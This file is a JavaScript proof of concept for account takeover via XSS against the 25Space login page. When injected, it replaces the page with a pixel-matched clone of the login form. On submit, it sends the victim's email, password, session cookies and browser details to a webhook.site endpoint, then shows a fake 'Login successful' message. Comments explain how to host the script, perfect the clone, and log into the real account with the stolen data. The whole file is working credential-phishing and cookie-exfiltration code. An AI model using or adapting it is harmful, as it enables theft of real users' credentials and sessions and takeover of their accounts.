// Ultimate PoC for ATO via XSS: Full page takeover cloning exact 25Space login
// Replaces entire document with cloned page - looks identical, loads relative images from domain
// On submit, exfils creds + cookies to webhook, then "logs in" by removing overlay or reloading
// Host this JS on your GitHub, inject via XSS payload
// IMPORTANT: Inspect real page (F12 > Network tab) to confirm exact image paths (e.g., /assets/images/logo.png, /assets/images/bg.jpg, QR src)
// Replace placeholders in <img src> and background-url below with exact paths for 100% match
// Test: Enter fake creds, check webhook for capture. Show ATO by logging into real account with captured data.

(function() {
  const webhookUrl = 'https://webhook.site/c47a99a0-d241-401a-888d-e44e31dbb274'; // Replace with your webhook

  const fullPageHTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cloud Management Suite - Login</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-image: url('/assets/images/login-background.jpg'); /* Replace with exact bg path, e.g., /images/good-morning-bg.jpg */
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      color: white;
      height: 100vh;
      overflow: hidden;
    }
    .container {
      display: flex;
      height: 100vh;
      max-width: 1200px;
      margin: 0 auto;
      width: 100%;
    }
    .left {
      flex: 1;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: flex-start;
      padding: 2rem;
      background: rgba(0, 0, 0, 0.1); /* Slight overlay if needed */
    }
    .left h1 {
      font-size: 3.5rem;
      font-weight: 300;
      margin-bottom: 1rem;
      text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
    }
    .left p {
      font-size: 1.1rem;
      line-height: 1.5;
      margin-bottom: 2rem;
      max-width: 80%;
    }
    .qr-code {
      width: 200px;
      height: 200px;
      border: 4px solid white;
      border-radius: 8px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
    }
    .right {
      flex: 1;
      background: rgba(0, 0, 0, 0.75);
      display: flex;
      flex-direction: column;
      justify-content: center;
      padding: 3rem 2rem;
    }
    .logo {
      width: 60px;
      height: auto;
      margin: 0 auto 1.5rem;
      display: block;
    }
    .right h2 {
      text-align: center;
      font-size: 1.5rem;
      font-weight: 300;
      margin-bottom: 2rem;
      color: #fff;
    }
    form {
      width: 100%;
      max-width: 350px;
      margin: 0 auto;
    }
    input[type="email"], input[type="password"] {
      width: 100%;
      padding: 1rem;
      margin-bottom: 1rem;
      background: #333;
      border: none;
      border-radius: 5px;
      color: #fff;
      font-size: 1rem;
      outline: none;
    }
    input[type="email"]::placeholder, input[type="password"]::placeholder {
      color: #aaa;
    }
    .remember {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1.5rem;
      color: #ccc;
      font-size: 0.9rem;
    }
    .remember input[type="checkbox"] {
      margin-right: 0.5rem;
    }
    .problems-link {
      color: #ff9500;
      text-decoration: none;
      font-size: 0.9rem;
    }
    .problems-link:hover {
      text-decoration: underline;
    }
    button {
      width: 100%;
      padding: 1rem;
      background: #ff9500;
      color: #000;
      border: none;
      border-radius: 25px;
      font-size: 1.1rem;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s;
    }
    button:hover {
      background: #e68500;
    }
    .create-account {
      text-align: center;
      margin-top: 1.5rem;
      color: #ccc;
      font-size: 0.9rem;
    }
    .create-link {
      color: #ff9500;
      text-decoration: none;
    }
    .create-link:hover {
      text-decoration: underline;
    }
    footer {
      position: absolute;
      bottom: 1rem;
      left: 50%;
      transform: translateX(-50%);
      text-align: center;
      color: #ccc;
      font-size: 0.8rem;
      width: 100%;
    }
    @media (max-width: 768px) {
      .container { flex-direction: column; height: auto; }
      .left, .right { padding: 1rem; }
      .left h1 { font-size: 2.5rem; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="left">
      <h1>Good morning!</h1>
      <p>Use 25Space across any device on the go. Scan the QR code to continue on other devices.</p>
      <img src="/assets/images/qr-login.png" alt="QR Code" class="qr-code"> <!-- Replace with exact QR path -->
    </div>
    <div class="right">
      <img src="/assets/images/logo.png" alt="25Space Logo" class="logo"> <!-- Replace with exact logo path -->
      <h2>Cloud Management Suite.</h2>
      <form id="loginForm">
        <input type="email" placeholder="Email" required>
        <input type="password" placeholder="Password" required>
        <div class="remember">
          <label><input type="checkbox"> Remember me</label>
          <a href="#" class="problems-link">Problems with login?</a>
        </div>
        <button type="submit">Sign in</button>
        <div class="create-account">
          Don't have an account? <a href="#" class="create-link">Create an account</a>
        </div>
      </form>
    </div>
  </div>
  <footer>&copy; 2015-2025 25space.com - Legal - Privacy - About - Health</footer>

  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const formData = new FormData(this);
      const data = {
        email: this.querySelector('input[type="email"]').value,
        password: this.querySelector('input[type="password"]').value,
        remember: this.querySelector('input[type="checkbox"]').checked,
        cookies: document.cookie,
        userAgent: navigator.userAgent,
        url: window.location.href
      };
      fetch('${webhookUrl}', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      }).then(() => {
        // Simulate successful login: redirect to dashboard or reload
        alert('Login successful!'); // Or window.location.href = '/dashboard';
        // window.location.reload();
      }).catch(err => console.error('Exfil error:', err));
    });
  </script>
</body>
</html>`;

  // Replace the entire page
  document.open();
  document.write(fullPageHTML);
  document.close();
})();
